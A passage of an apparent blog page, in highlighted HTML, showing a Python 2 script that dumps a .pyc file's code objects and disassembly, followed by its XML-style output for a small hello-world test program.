class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> dis, marshal, struct, sys, time, types  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show_file</span><span class=\"params\">(fname)</span>:</span>  </span><br><span class=\"line\">    f = open(fname, <span class=\"string\">\"rb\"</span>)  </span><br><span class=\"line\">    magic = f.read(<span class=\"number\">4</span>)  </span><br><span class=\"line\">    moddate = f.read(<span class=\"number\">4</span>)  </span><br><span class=\"line\">    modtime = time.asctime(time.localtime(struct.unpack(<span class=\"string\">'L'</span>, moddate)[<span class=\"number\">0</span>]))  </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"magic %s\"</span> % (magic.encode(<span class=\"string\">'hex'</span>))  </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"moddate %s (%s)\"</span> % (moddate.encode(<span class=\"string\">'hex'</span>), modtime)  </span><br><span class=\"line\">    code = marshal.load(f)  </span><br><span class=\"line\">    show_code(code)  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show_code</span><span class=\"params\">(code, indent=<span class=\"string\">''</span>)</span>:</span>  </span><br><span class=\"line\">    old_indent = indent  </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"%s&lt;code&gt;\"</span> % indent  </span><br><span class=\"line\">    indent += <span class=\"string\">'   '</span>  </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"%s&lt;argcount&gt; %d &lt;/argcount&gt;\"</span> % (indent, code.co_argcount)  </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"%s&lt;nlocals&gt; %d&lt;/nlocals&gt;\"</span> % (indent, code.co_nlocals)  </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"%s&lt;stacksize&gt; %d&lt;/stacksize&gt;\"</span> % (indent, code.co_stacksize)  </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"%s&lt;flags&gt; %04x&lt;/flags&gt;\"</span> % (indent, code.co_flags)  </span><br><span class=\"line\">    show_hex(<span class=\"string\">\"code\"</span>, code.co_code, indent=indent)  </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"%s&lt;dis&gt;\"</span> % indent  </span><br><span class=\"line\">    dis.disassemble(code)  </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"%s&lt;/dis&gt;\"</span> % indent  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"%s&lt;names&gt; %r&lt;/names&gt;\"</span> % (indent, code.co_names)  </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"%s&lt;varnames&gt; %r&lt;/varnames&gt;\"</span> % (indent, code.co_varnames)  </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"%s&lt;freevars&gt; %r&lt;/freevars&gt;\"</span> % (indent, code.co_freevars)  </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"%s&lt;cellvars&gt; %r&lt;/cellvars&gt;\"</span> % (indent, code.co_cellvars)  </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"%s&lt;filename&gt; %r&lt;/filename&gt;\"</span> % (indent, code.co_filename)  </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"%s&lt;name&gt; %r&lt;/name&gt;\"</span> % (indent, code.co_name)  </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"%s&lt;firstlineno&gt; %d&lt;/firstlineno&gt;\"</span> % (indent, code.co_firstlineno)  </span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"%s&lt;consts&gt;\"</span> % indent  </span><br><span class=\"line\">    <span class=\"keyword\">for</span> const <span class=\"keyword\">in</span> code.co_consts:  </span><br><span class=\"line\">        <span class=\"keyword\">if</span> type(const) == types.CodeType:  </span><br><span class=\"line\">            show_code(const, indent+<span class=\"string\">'   '</span>)  </span><br><span class=\"line\">        <span class=\"keyword\">else</span>:  </span><br><span class=\"line\">            <span class=\"keyword\">print</span> <span class=\"string\">\"   %s%r\"</span> % (indent, const)  </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"%s&lt;/consts&gt;\"</span> % indent  </span><br><span class=\"line\"></span><br><span class=\"line\">    show_hex(<span class=\"string\">\"lnotab\"</span>, code.co_lnotab, indent=indent)  </span><br><span class=\"line\">    <span class=\"keyword\">print</span> <span class=\"string\">\"%s&lt;/code&gt;\"</span> % old_indent  </span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">show_hex</span><span class=\"params\">(label, h, indent)</span>:</span>  </span><br><span class=\"line\">    h = h.encode(<span class=\"string\">'hex'</span>)  </span><br><span class=\"line\">    <span class=\"keyword\">if</span> len(h) &lt; <span class=\"number\">60</span>:  </span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">\"%s&lt;%s&gt; %s&lt;/%s&gt;\"</span> % (indent, label, h,label)  </span><br><span class=\"line\">    <span class=\"keyword\">else</span>:  </span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">\"%s&lt;%s&gt;\"</span> % (indent, label)  </span><br><span class=\"line\">        <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> range(<span class=\"number\">0</span>, len(h), <span class=\"number\">60</span>):  </span><br><span class=\"line\">            <span class=\"keyword\">print</span> <span class=\"string\">\"%s   %s\"</span> % (indent, h[i:i+<span class=\"number\">60</span>])  </span><br><span class=\"line\">        <span class=\"keyword\">print</span> <span class=\"string\">\"%s&lt;/%s&gt;\"</span> % (indent, label)  </span><br><span class=\"line\"></span><br><span class=\"line\">show_file(sys.argv[<span class=\"number\">1</span>])</span><br></pre></td></tr></table></figure>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">showfile.py test.pyc &gt; test.xml</span><br></pre></td></tr></table></figure>\n<ul>\n<li>test.xml</li>\n</ul>\n<figure class=\"highlight xml\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">magic 03f30d0a</span><br><span class=\"line\">moddate 9c4cdf58 (Sat Apr  1 14:45:48 2017)</span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">code</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">argcount</span>&gt;</span> 0 <span class=\"tag\">&lt;/<span class=\"name\">argcount</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">nlocals</span>&gt;</span> 0<span class=\"tag\">&lt;/<span class=\"name\">nlocals</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">stacksize</span>&gt;</span> 3<span class=\"tag\">&lt;/<span class=\"name\">stacksize</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">flags</span>&gt;</span> 0040<span class=\"tag\">&lt;/<span class=\"name\">flags</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">code</span>&gt;</span></span><br><span class=\"line\">      6400006401006c00005a00006501005a02006402008400005a0300640300</span><br><span class=\"line\">      640500640400840000830000595a04006504008300005a05006505006a06</span><br><span class=\"line\">      008300000164010053</span><br><span class=\"line\">   <span class=\"tag\">&lt;/<span class=\"name\">code</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">dis</span>&gt;</span></span><br><span class=\"line\">  1           0 LOAD_CONST               0 (-1)</span><br><span class=\"line\">              3 LOAD_CONST               1 (None)</span><br><span class=\"line\">              6 IMPORT_NAME              0 (dis)</span><br><span class=\"line\">              9 STORE_NAME               0 (dis)</span><br><span class=\"line\"></span><br><span class=\"line\">  2          12 LOAD_NAME                1 (True)</span><br><span class=\"line\">             15 STORE_NAME               2 (myglobal)</span><br><span class=\"line\"></span><br><span class=\"line\">  4          18 LOAD_CONST               2 (<span class=\"tag\">&lt;<span class=\"name\">code</span> <span class=\"attr\">object</span> <span class=\"attr\">add</span> <span class=\"attr\">at</span> <span class=\"attr\">0x10e0b7ab0</span>, <span class=\"attr\">file</span> \"<span class=\"attr\">test.py</span>\", <span class=\"attr\">line</span> <span class=\"attr\">4</span>&gt;</span>)</span><br><span class=\"line\">             21 MAKE_FUNCTION            0</span><br><span class=\"line\">             24 STORE_NAME               3 (add)</span><br><span class=\"line\"></span><br><span class=\"line\">  9          27 LOAD_CONST               3 ('world')</span><br><span class=\"line\">             30 LOAD_CONST               5 (())</span><br><span class=\"line\">             33 LOAD_CONST               4 (<span class=\"tag\">&lt;<span class=\"name\">code</span> <span class=\"attr\">object</span> <span class=\"attr\">world</span> <span class=\"attr\">at</span> <span class=\"attr\">0x10e0b7db0</span>, <span class=\"attr\">file</span> \"<span class=\"attr\">test.py</span>\", <span class=\"attr\">line</span> <span class=\"attr\">9</span>&gt;</span>)</span><br><span class=\"line\">             36 MAKE_FUNCTION            0</span><br><span class=\"line\">             39 CALL_FUNCTION            0</span><br><span class=\"line\">             42 BUILD_CLASS         </span><br><span class=\"line\">             43 STORE_NAME               4 (world)</span><br><span class=\"line\"></span><br><span class=\"line\"> 15          46 LOAD_NAME                4 (world)</span><br><span class=\"line\">             49 CALL_FUNCTION            0</span><br><span class=\"line\">             52 STORE_NAME               5 (w)</span><br><span class=\"line\"></span><br><span class=\"line\"> 16          55 LOAD_NAME                5 (w)</span><br><span class=\"line\">             58 LOAD_ATTR                6 (sayHello)</span><br><span class=\"line\">             61 CALL_FUNCTION            0</span><br><span class=\"line\">             64 POP_TOP             </span><br><span class=\"line\">             65 LOAD_CONST               1 (None)</span><br><span class=\"line\">             68 RETURN_VALUE        </span><br><span class=\"line\">   <span class=\"tag\">&lt;/<span class=\"name\">dis</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">names</span>&gt;</span> ('dis', 'True', 'myglobal', 'add', 'world', 'w', 'sayHello')<span class=\"tag\">&lt;/<span class=\"name\">names</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">varnames</span>&gt;</span> ()<span class=\"tag\">&lt;/<span class=\"name\">varnames</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">freevars</span>&gt;</span> ()<span class=\"tag\">&lt;/<span class=\"name\">freevars</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">cellvars</span>&gt;</span> ()<span class=\"tag\">&lt;/<span class=\"name\">cellvars</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">filename</span>&gt;</span> 'test.py'<span class=\"tag\">&lt;/<span class=\"name\">filename</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span> '<span class=\"tag\">&lt;<span class=\"name\">module</span>&gt;</span>'<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">firstlineno</span>&gt;</span> 1<span class=\"tag\">&lt;/<span class=\"name\">firstlineno</span>&gt;</span></span><br><span class=\"line\">   <span class=\"tag\">&lt;<span class=\"name\">consts</span>&gt;</span></span><br><span class=\"line\">      -1</span><br><span class=\"line\">      None</span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">code</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">argcount</span>&gt;</span> 1 <span class=\"tag\">&lt;/<span class=\"name\">argcount</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">nlocals</span>&gt;</span> 2<span class=\"tag\">&lt;/<span class=\"name\">nlocals</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">stacksize</span>&gt;</span> 2<span class=\"tag\">&lt;/<span class=\"name\">stacksize</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">flags</span>&gt;</span> 0043<span class=\"tag\">&lt;/<span class=\"name\">flags</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">code</span>&gt;</span> 6401007d01007c00007c0100377d00007c000053<span class=\"tag\">&lt;/<span class=\"name\">code</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">dis</span>&gt;</span></span><br><span class=\"line\">  5           0 LOAD_CONST               1 (1)</span><br><span class=\"line\">              3 STORE_FAST               1 (b)</span><br><span class=\"line\"></span><br><span class=\"line\">  6           6 LOAD_FAST                0 (a)</span><br><span class=\"line\">              9 LOAD_FAST                1 (b)</span><br><span class=\"line\">             12 INPLACE_ADD         </span><br><span class=\"line\">             13 STORE_FAST               0 (a)</span><br><span class=\"line\"></span><br><span class=\"line\">  7          16 LOAD_FAST                0 (a)</span><br><span class=\"line\">             19 RETURN_VALUE        </span><br><span class=\"line\">         <span class=\"tag\">&lt;/<span class=\"name\">dis</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">names</span>&gt;</span> ()<span class=\"tag\">&lt;/<span class=\"name\">names</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">varnames</span>&gt;</span> ('a', 'b')<span class=\"tag\">&lt;/<span class=\"name\">varnames</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">freevars</span>&gt;</span> ()<span class=\"tag\">&lt;/<span class=\"name\">freevars</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">cellvars</span>&gt;</span> ()<span class=\"tag\">&lt;/<span class=\"name\">cellvars</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">filename</span>&gt;</span> 'test.py'<span class=\"tag\">&lt;/<span class=\"name\">filename</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span> 'add'<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">firstlineno</span>&gt;</span> 4<span class=\"tag\">&lt;/<span class=\"name\">firstlineno</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">consts</span>&gt;</span></span><br><span class=\"line\">            None</span><br><span class=\"line\">            1</span><br><span class=\"line\">         <span class=\"tag\">&lt;/<span class=\"name\">consts</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">lnotab</span>&gt;</span> 000106010a01<span class=\"tag\">&lt;/<span class=\"name\">lnotab</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;/<span class=\"name\">code</span>&gt;</span></span><br><span class=\"line\">      'world'</span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">code</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">argcount</span>&gt;</span> 0 <span class=\"tag\">&lt;/<span class=\"name\">argcount</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">nlocals</span>&gt;</span> 0<span class=\"tag\">&lt;/<span class=\"name\">nlocals</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">stacksize</span>&gt;</span> 1<span class=\"tag\">&lt;/<span class=\"name\">stacksize</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">flags</span>&gt;</span> 0042<span class=\"tag\">&lt;/<span class=\"name\">flags</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">code</span>&gt;</span> 6500005a01006400008400005a02006401008400005a03005253<span class=\"tag\">&lt;/<span class=\"name\">code</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">dis</span>&gt;</span></span><br><span class=\"line\">  9           0 LOAD_NAME                0 (__name__)</span><br><span class=\"line\">              3 STORE_NAME               1 (__module__)</span><br><span class=\"line\"></span><br><span class=\"line\"> 10           6 LOAD_CONST               0 (<span class=\"tag\">&lt;<span class=\"name\">code</span> <span class=\"attr\">object</span> <span class=\"attr\">__init__</span> <span class=\"attr\">at</span> <span class=\"attr\">0x10e0b7c30</span>, <span class=\"attr\">file</span> \"<span class=\"attr\">test.py</span>\", <span class=\"attr\">line</span> <span class=\"attr\">10</span>&gt;</span>)</span><br><span class=\"line\">              9 MAKE_FUNCTION            0</span><br><span class=\"line\">             12 STORE_NAME               2 (__init__)</span><br><span class=\"line\"></span><br><span class=\"line\"> 12          15 LOAD_CONST               1 (<span class=\"tag\">&lt;<span class=\"name\">code</span> <span class=\"attr\">object</span> <span class=\"attr\">sayHello</span> <span class=\"attr\">at</span> <span class=\"attr\">0x10e0b7d30</span>, <span class=\"attr\">file</span> \"<span class=\"attr\">test.py</span>\", <span class=\"attr\">line</span> <span class=\"attr\">12</span>&gt;</span>)</span><br><span class=\"line\">             18 MAKE_FUNCTION            0</span><br><span class=\"line\">             21 STORE_NAME               3 (sayHello)</span><br><span class=\"line\">             24 LOAD_LOCALS         </span><br><span class=\"line\">             25 RETURN_VALUE        </span><br><span class=\"line\">         <span class=\"tag\">&lt;/<span class=\"name\">dis</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">names</span>&gt;</span> ('__name__', '__module__', '__init__', 'sayHello')<span class=\"tag\">&lt;/<span class=\"name\">names</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">varnames</span>&gt;</span> ()<span class=\"tag\">&lt;/<span class=\"name\">varnames</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">freevars</span>&gt;</span> ()<span class=\"tag\">&lt;/<span class=\"name\">freevars</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">cellvars</span>&gt;</span> ()<span class=\"tag\">&lt;/<span class=\"name\">cellvars</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">filename</span>&gt;</span> 'test.py'<span class=\"tag\">&lt;/<span class=\"name\">filename</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span> 'world'<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">firstlineno</span>&gt;</span> 9<span class=\"tag\">&lt;/<span class=\"name\">firstlineno</span>&gt;</span></span><br><span class=\"line\">         <span class=\"tag\">&lt;<span class=\"name\">consts</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">code</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">argcount</span>&gt;</span> 1 <span class=\"tag\">&lt;/<span class=\"name\">argcount</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">nlocals</span>&gt;</span> 1<span class=\"tag\">&lt;/<span class=\"name\">nlocals</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">stacksize</span>&gt;</span> 1<span class=\"tag\">&lt;/<span class=\"name\">stacksize</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">flags</span>&gt;</span> 0043<span class=\"tag\">&lt;/<span class=\"name\">flags</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">code</span>&gt;</span> 64000053<span class=\"tag\">&lt;/<span class=\"name\">code</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">dis</span>&gt;</span></span><br><span class=\"line\"> 11           0 LOAD_CONST               0 (None)</span><br><span class=\"line\">              3 RETURN_VALUE        </span><br><span class=\"line\">               <span class=\"tag\">&lt;/<span class=\"name\">dis</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">names</span>&gt;</span> ()<span class=\"tag\">&lt;/<span class=\"name\">names</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">varnames</span>&gt;</span> ('self',)<span class=\"tag\">&lt;/<span class=\"name\">varnames</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">freevars</span>&gt;</span> ()<span class=\"tag\">&lt;/<span class=\"name\">freevars</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">cellvars</span>&gt;</span> ()<span class=\"tag\">&lt;/<span class=\"name\">cellvars</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">filename</span>&gt;</span> 'test.py'<span class=\"tag\">&lt;/<span class=\"name\">filename</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">name</span>&gt;</span> '__init__'<span class=\"tag\">&lt;/<span class=\"name\">name</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">firstlineno</span>&gt;</span> 10<span class=\"tag\">&lt;/<span class=\"name\">firstlineno</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">consts</span>&gt;</span></span><br><span class=\"line\">                  None</span><br><span class=\"line\">               <span class=\"tag\">&lt;/<span class=\"name\">consts</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">lnotab</span>&gt;</span> 0001<span class=\"tag\">&lt;/<span class=\"name\">lnotab</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;/<span class=\"name\">code</span>&gt;</span></span><br><span class=\"line\">            <span class=\"tag\">&lt;<span class=\"name\">code</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">argcount</span>&gt;</span> 1 <span class=\"tag\">&lt;/<span class=\"name\">argcount</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">nlocals</span>&gt;</span> 1<span class=\"tag\">&lt;/<span class=\"name\">nlocals</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">stacksize</span>&gt;</span> 1<span class=\"tag\">&lt;/<span class=\"name\">stacksize</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">flags</span>&gt;</span> 0043<span class=\"tag\">&lt;/<span class=\"name\">flags</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">code</span>&gt;</span> 640100474864000053<span class=\"tag\">&lt;/<span class=\"name\">code</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">dis</span>&gt;</span></span><br><span class=\"line\"> 13           0 LOAD_CONST               1 ('hello,world')</span><br><span class=\"line\">              3 PRINT_ITEM          </span><br><span class=\"line\">              4 PRINT_NEWLINE       </span><br><span class=\"line\">              5 LOAD_CONST               0 (None)</span><br><span class=\"line\">              8 RETURN_VALUE        </span><br><span class=\"line\">               <span class=\"tag\">&lt;/<span class=\"name\">dis</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">names</span>&gt;</span> ()<span class=\"tag\">&lt;/<span class=\"name\">names</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">varnames</span>&gt;</span> ('self',)<span class=\"tag\">&lt;/<span class=\"name\">varnames</span>&gt;</span></span><br><span class=\"line\">               <span class=\"tag\">&lt;<span class=\"name\">freevars</span>&gt;</span> ()<span class=\"tag\">&lt;/<span 